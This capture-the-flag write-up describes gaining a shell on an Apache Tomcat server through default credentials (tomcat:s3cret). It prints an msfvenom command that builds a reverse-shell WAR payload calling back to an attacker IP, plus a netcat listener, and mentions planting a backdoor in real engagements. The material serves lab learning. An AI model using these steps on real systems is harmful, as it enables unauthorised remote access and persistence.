## Initial Access - Default credentials to Apache Tomcat leads to malicious file upload

**Vulnerability Explanation:** The webserver on port 8080 uses Apache Tomcat. The server is using default credentials. With the credentialed access, a malicious .war file is able to be uploaded in order to gain remote access to the machine.

**Vulnerability Fix:** Change the default credentials to secure credentials.

**Severity:** Critical

**Steps to reproduce the attack:** Christian discovered an Apache Tomcat server running on port 8080. It uses default credentials tomcat:s3cret. He was able to upload a malicious .war file to the server and access it to gain a reverse shell.

**Port Scan Results**

**TCP:** 8080

**UDP:** N/A

Use nmap to scan the target for open ports.

TCP port 8080 was discovered.

```shell
sudo nmap -p- -T5 -vvv 10.10.10.95 -oN nmap.initial
```

Navigating to the site on port 8080 reveals Apache Tomcat 7.0.88 running.

We're able to upload a 'WAR' file. This will allow us to gain a shell on the system if we're able to access the file we upload.

Create a malicious .war file using msfvenom and see the contents using 'jar'

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f war > shell.war
```

```
jar -ft shell.war
```

Start a netcat listener on port 4444. Upload the file and navigate to the .jsp file in the web browser.
```
nc -nlvp 4444
```

We have successfully got initial access to the machine as 'nt authority'. 

'nt authority' is a high privileged user so privilege escalation is not needed.

## Privilege Escalation - N/A

**Vulnerability Explanation:** N/A

**Vulnerability Fix:** N/A

**Severity:** N/A

**Steps to reproduce the attack:** N/A

## Post Exploitation

Since this is a CTF the objective is only to retreive the flag located in the /root directory as a privileged user. 

In a real world assessment, we would attempt to add a back door for continuous access to the machine.
